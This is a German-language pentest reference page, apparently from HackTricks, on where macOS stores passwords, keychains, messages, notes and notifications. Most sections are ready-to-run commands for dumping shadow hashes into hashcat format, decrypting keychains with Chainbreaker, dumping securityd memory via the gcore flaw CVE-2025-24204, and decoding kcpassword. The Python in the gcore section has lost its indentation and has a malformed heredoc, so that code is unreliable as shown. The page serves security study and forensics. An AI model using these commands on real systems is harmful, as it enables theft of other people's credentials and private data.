# Sensible Speicherorte und interessante Daemons unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## Passwörter

### Shadow Passwords

Das Shadow Password wird zusammen mit der Konfiguration des Benutzers in Plists gespeichert, die sich unter **`/var/db/dslocal/nodes/Default/users/`** befinden.\
Mit dem folgenden oneliner können **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) ausgelesen werden:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte wie dieses**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in das **hashcat**-**Format** umzuwandeln.

Eine alternative One-Liner, die die Credentials aller Nicht-Service-Accounts im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Eine weitere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, besteht darin, `dscl` zu verwenden: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Diese Datei wird **nur** verwendet, wenn das System im **single-user mode** ausgeführt wird (also nicht sehr häufig).

### Keychain Dump

Beachten Sie, dass bei Verwendung des security-Binaries zum **dumpen der entschlüsselten Passwörter** mehrere Eingabeaufforderungen angezeigt werden, in denen der Benutzer diesen Vorgang erlauben muss.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
Auf modernen macOS-Systemen sind die interessantesten zugrunde liegenden Speicher normalerweise **`~/Library/Keychains/login.keychain-db`** und **`/Library/Keychains/System.keychain`**. Es handelt sich um SQLite-basierte Dateien, der Zugriff auf Klartext wird jedoch weiterhin von **`securityd`** vermittelt: Der Diebstahl der reinen Datenbank liefert hauptsächlich Metadaten und verschlüsselte Blobs, sofern nicht zusätzlich das Passwort des Benutzers, `SystemKey` oder ein im Speicher befindlicher Master Key wiederhergestellt wird.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basierend auf diesem Kommentar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) sieht es so aus, als würden diese Tools unter Big Sur nicht mehr funktionieren.

### Überblick über Keychaindump

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Keychains zu extrahieren. Wie eine [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) zeigt, weist es jedoch auf neueren macOS-Versionen wie Big Sur Einschränkungen auf. Die Verwendung von **keychaindump** setzt voraus, dass der Angreifer Zugriff erlangt und seine Privilegien auf **root** eskaliert. Das Tool nutzt die Tatsache aus, dass die Keychain standardmäßig beim Anmelden des Benutzers entsperrt wird, um den Zugriff für Anwendungen zu erleichtern, ohne wiederholt das Passwort des Benutzers anfordern zu müssen. Wenn ein Benutzer jedoch festlegt, dass seine Keychain nach jeder Verwendung gesperrt wird, ist **keychaindump** nicht mehr effektiv.

**Keychaindump** zielt auf einen bestimmten Prozess namens **securityd**, den Apple als Daemon für Autorisierungs- und kryptografische Vorgänge beschreibt und der für den Zugriff auf die Keychain entscheidend ist. Der Extraktionsprozess umfasst das Auffinden eines **Master Key**, der aus dem Anmeldepasswort des Benutzers abgeleitet wird. Dieser Schlüssel ist zum Lesen der Keychain-Datei erforderlich. Um den **Master Key** zu finden, scannt **keychaindump** den Speicher-Heap von **securityd** mit dem Befehl `vmmap` und sucht in als `MALLOC_TINY` markierten Bereichen nach potenziellen Schlüsseln. Der folgende Befehl wird verwendet, um diese Speicherbereiche zu untersuchen:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nach der Identifizierung potenzieller master keys durchsucht **keychaindump** die Heaps nach einem bestimmten Muster (`0x0000000000000018`), das auf einen Kandidaten für den master key hinweist. Zur Verwendung dieses Keys sind weitere Schritte, einschließlich der Deobfuscation, erforderlich, wie im Quellcode von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zur Entschlüsselung des Keychains im Speicher des Prozesses **securityd** gespeichert sind. Ein Beispiel für die Ausführung von **keychaindump** lautet:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen auf forensisch belastbare Weise aus einem OSX-Keychain zu extrahieren:

- Gehashtes Keychain-Passwort, geeignet zum Cracken mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
- Internet-Passwörter
- Allgemeine Passwörter
- Private Schlüssel
- Öffentliche Schlüssel
- X509-Zertifikate
- Sichere Notizen
- Appleshare-Passwörter

Wenn das Keychain-Entsperrpasswort, ein mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) erhaltener Master-Key oder eine Entsperrdatei wie SystemKey vorhanden ist, stellt Chainbreaker außerdem Passwörter im Klartext bereit.

Ohne eine dieser Methoden zum Entsperren des Keychain zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Keychain-Keys (mit Passwörtern) mit SystemKey dumpen**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Schlüsselbund-Schlüssel dumpen (mit Passwörtern) und den Hash knacken**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Schlüssel (mit Passwörtern) per Memory Dump auslesen**

[Befolge diese Schritte](../index.html#dumping-memory-with-osxpmem), um einen **Memory Dump** durchzuführen.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain-Schlüssel (mit Passwörtern) mithilfe des Benutzerpassworts dumpen**

Wenn du das Passwort des Benutzers kennst, kannst du es verwenden, um **Keychains zu dumpen und zu entschlüsseln, die dem Benutzer gehören**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) wurde mit `/usr/bin/gcore` und dem **`com.apple.system-task-ports.read`**-Entitlement ausgeliefert, sodass jeder lokale Admin (oder eine bösartige signierte App) **beliebigen Prozessspeicher dumpen konnte, selbst wenn SIP/TCC erzwungen wurden**. Das Dumpen von `securityd` leakt den **Keychain-Master-Key** im Klartext und ermöglicht es, `login.keychain-db` ohne das Benutzerpasswort zu entschlüsseln.<sup>[[1]](#references)</sup>

**Quick repro auf verwundbaren Builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Führe den extrahierten Hex-Schlüssel an Chainbreaker (`--key <hex>`) weiter, um den Anmeldeschlüsselbund zu entschlüsseln. Apple hat das Entitlement in **macOS 15.3+** entfernt, daher funktioniert dies nur bei ungepatchten Sequoia-Builds oder auf Systemen, auf denen die verwundbare Binary erhalten geblieben ist.

### kcpassword

Die Datei **kcpassword** enthält das **Anmeldepasswort des Benutzers**, jedoch nur, wenn der Eigentümer des Systems **automatische Anmeldung aktiviert** hat. Dadurch wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht besonders sicher ist).

Das Passwort wird in der Datei **`/etc/kcpassword`** gespeichert und per XOR mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** verknüpft. Wenn das Passwort länger als der Schlüssel ist, wird der Schlüssel wiederverwendet.\
Dadurch lässt sich das Passwort relativ einfach wiederherstellen, beispielsweise mit Scripts wie [**diesem hier**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Nachrichten
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Benachrichtigungen

Vor **Sequoia** befindet sich der Store des Notification Center normalerweise unter **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+** hat Apple ihn in den durch TCC geschützten Gruppencontainer **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** verschoben.

Die meisten interessanten Informationen sind in **blob**-Spalten gespeichert. Daher müssen Sie diesen Inhalt extrahieren und in etwas für Menschen Lesbares umwandeln (`plutil -p -`, `strings` oder ein kleiner Parser). Beispiele für eine schnelle Triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Neuere Datenschutzprobleme (NotificationCenter DB)

- In macOS **14.7–15.1** speicherte Apple Banner-Inhalte ohne ordnungsgemäße Schwärzung in der `db2/db`-SQLite-Datenbank. Die CVEs **CVE-2024-44292/44293/40838/54504** ermöglichten es jedem lokalen Benutzer, den Benachrichtigungstext anderer Benutzer allein durch das Öffnen der DB zu lesen (ohne TCC prompt).
- Apple entschärfte dies, indem die DB in `group.com.apple.usernoted` verschoben und in neueren Sequoia-Builds mit TCC geschützt wurde. Auf aktuellen Systemen benötigt man daher normalerweise den richtigen Benutzerkontext oder einen TCC bypass, um sie zu lesen.<sup>[[3]](#references)</sup>
- Bei Legacy-Endpunkten sollten die Dateien `db`, `db-wal` und `db-shm` gemeinsam kopiert werden, bevor ein Update oder Neustart durchgeführt wird, wenn die Artefakte erhalten bleiben sollen.

### Hinweise

Die **Notizen** der Benutzer befinden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Wenn der obige **one-liner** zu viele Ausgaben erzeugt, exportiere `ZICNOTEDATA.ZDATA`, entpacke es mit gunzip und parse das protobuf: Das ist normalerweise zuverlässiger, als `strings` direkt auf der SQLite-Datenbank auszuführen.

### Hintergrundaufgaben / Login-Elemente

Seit **Ventura** werden vom Benutzer genehmigte Login-Elemente und mehrere Hintergrundaufgaben in **BTM**-Stores wie **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** und im versionierten System-Cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** erfasst.

Diese Dateien sind nützlich, um schnell Persistenz, Hilfsprogramme und einige von MDM verwaltete Hintergrundelemente zu identifizieren:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Für den Persistence-Aspekt und die BTM-Interna siehe [die Seite zu Auto-Start-Positionen](../../macos-auto-start-locations.md#login-items) und [die Notizen zu Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Einstellungen

In macOS befinden sich die App-Einstellungen in **`$HOME/Library/Preferences`** und in iOS unter `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Unter macOS kann das CLI-Tool **`defaults`** verwendet werden, um die **Preferences-Datei zu ändern**.

**`/usr/sbin/cfprefsd`** beansprucht die XPC-Services `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen durchzuführen.

## OpenDirectory permissions.plist

Die Datei `/System/Library/OpenDirectory/permissions.plist` enthält Berechtigungen, die auf Node-Attribute angewendet werden, und ist durch SIP geschützt.\
Diese Datei gewährt bestimmten Benutzern anhand ihrer UUID (und nicht ihrer UID) Berechtigungen, sodass sie auf bestimmte sensible Informationen wie `ShadowHashData`, `HeimdalSRPKey` und `KerberosKeys` zugreifen können, neben anderen:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Systembenachrichtigungen

### Darwin-Benachrichtigungen

Der wichtigste Daemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den Mach-Port `com.apple.system.notification_center` registrieren (überprüfe sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon wird über die Datei `/etc/notify.conf` konfiguriert.

Die für Benachrichtigungen verwendeten Namen sind eindeutige Reverse-DNS-Notationen. Wenn eine Benachrichtigung an einen dieser Namen gesendet wird, erhalten die Clients, die angegeben haben, dass sie diese verarbeiten können, die Benachrichtigung.

Es ist möglich, den aktuellen Status zu speichern (und alle Namen anzuzeigen), indem das Signal SIGUSR2 an den notifyd-Prozess gesendet und anschließend die erzeugte Datei gelesen wird: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Das **Distributed Notification Center**, dessen Haupt-Binary **`/usr/sbin/distnoted`** ist, stellt eine weitere Möglichkeit zum Senden von Benachrichtigungen dar. Es stellt einige XPC-Services bereit und führt einige Prüfungen durch, um zu versuchen, Clients zu verifizieren.

### Apple Push Notifications (APN)

In diesem Fall können sich Anwendungen für **topics** registrieren. Der Client generiert ein Token, indem er über **`apsd`** Kontakt mit den Servern von Apple aufnimmt.\
Anschließend haben auch die Provider ein Token generiert und können sich mit den Servern von Apple verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die darauf wartende Anwendung weiterleitet.

Die Einstellungen befinden sich in `/Library/Preferences/com.apple.apsd.plist`.

In macOS gibt es eine lokale Nachrichtendatenbank unter `/Library/Application\ Support/ApplePushService/aps.db` und in iOS unter `/var/mobile/Library/ApplePushService`. Sie enthält 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Es ist auch möglich, Informationen über den Daemon und Verbindungen mit Folgendem abzurufen:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Benachrichtigungen für Benutzer

Dies sind Benachrichtigungen, die der Benutzer auf dem Bildschirm sehen sollte:

- **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
- **The Bulletin Board**: Dies zeigt in iOS ein Banner an, das verschwindet und im Notification Center gespeichert wird.
- **`NSUserNotificationCenter`**: Dies ist das iOS bulletin board in macOS. In älteren macOS-Versionen befindet sich die Datenbank normalerweise unter `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; ab Sequoia+ wurde sie nach `~/Library/Group Containers/group.com.apple.usernoted/db2/db` verschoben.

## Referenzen

- [1] [HelpNetSecurity – macOS-gcore-Berechtigung ermöglichte die Extraktion des Keychain-Masterschlüssels (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Schutz von Keychain-Daten](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple geht Datenschutzbedenken bezüglich der Notification-Center-Datenbank in macOS Sequoia an](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
